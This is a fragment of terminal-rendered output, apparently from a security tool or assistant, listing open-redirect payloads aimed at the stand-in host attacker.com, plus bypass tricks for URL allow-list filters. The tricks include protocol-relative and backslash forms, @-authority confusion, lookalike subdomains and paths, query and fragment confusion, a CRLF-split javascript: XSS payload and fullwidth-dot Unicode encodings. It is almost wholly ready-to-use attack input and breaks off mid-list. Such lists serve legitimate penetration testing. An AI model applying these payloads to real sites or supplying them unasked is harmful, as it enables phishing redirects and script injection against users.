[34m│[0m                                                                              [34m│[0m
[34m│[0m ### Basic Redirect Payloads                                                  [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **Direct external URL:**                                                     [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m ?redirect=https://attacker.com                                               [34m│[0m
[34m│[0m ?redirect=http://attacker.com                                                [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **Protocol-relative (inherits current protocol):**                           [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m ?redirect=//attacker.com                                                     [34m│[0m
[34m│[0m ?redirect=////attacker.com                                                   [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ### Bypass Techniques                                                        [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **When http:// or https:// is blocked:**                                     [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m //attacker.com                                                               [34m│[0m
[34m│[0m ////attacker.com                                                             [34m│[0m
[34m│[0m https:attacker.com                                                           [34m│[0m
[34m│[0m \/\/attacker.com                                                             [34m│[0m
[34m│[0m /\/attacker.com                                                              [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **Using @ symbol (URL authority confusion):**                                [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m http://trusted.com@attacker.com/                                             [34m│[0m
[34m│[0m https://trusted.com@attacker.com/path                                        [34m│[0m
[34m│[0m //{ALLOWED_DOMAIN}@attacker.com                                              [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **Whitelisted domain as subdomain:**                                         [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m https://attacker.com/trusted.com                                             [34m│[0m
[34m│[0m https://trusted.com.attacker.com                                             [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **Creating folders matching allowed domains:**                               [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m https://attacker.com/https://trusted.com/                                    [34m│[0m
[34m│[0m https://attacker.com/trusted.com/path                                        [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **Query string confusion:**                                                  [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m ?redirect=https://attacker.com?trusted.com                                   [34m│[0m
[34m│[0m ?redirect=https://attacker.com#trusted.com                                   [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **CRLF injection to bypass keyword filters:**                                [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m java%0d%0ascript%0d%0a:alert(document.domain)                                [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **Dot bypass with Unicode:**                                                 [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m //attacker。com          (fullwidth dot U+3002)                              [34m│[0m
[34m│[0m //attacker%E3%80%82com   (URL-encoded fullwidth dot)                         [34m│[0m
